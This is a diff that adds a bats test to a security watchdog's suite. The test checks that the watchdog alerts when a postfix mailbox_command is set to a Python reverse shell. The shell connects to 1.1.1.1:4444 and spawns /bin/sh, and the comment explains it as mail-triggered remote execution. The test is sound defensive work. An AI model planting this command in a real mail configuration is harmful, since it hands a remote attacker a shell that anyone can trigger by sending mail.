@@ -284,3 +284,20 @@ seed_benign() {
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on postfix mail-delivery surface)" {
+    # Sister to many other watchdog's python interpreter-rev-shell
+    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
+    # reach for python -c 'import socket,os,pty' to dodge shell-
+    # pattern detectors. Locks the python axis on the mail-
+    # triggered exec surface (T1546 — Event Triggered Execution
+    # via mail delivery; postfix mailbox_command runs AS the
+    # recipient user or root on every delivered message —
+    # remotely-triggerable by anyone who sends mail).
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf 'mailbox_command = python -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${MAIN}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
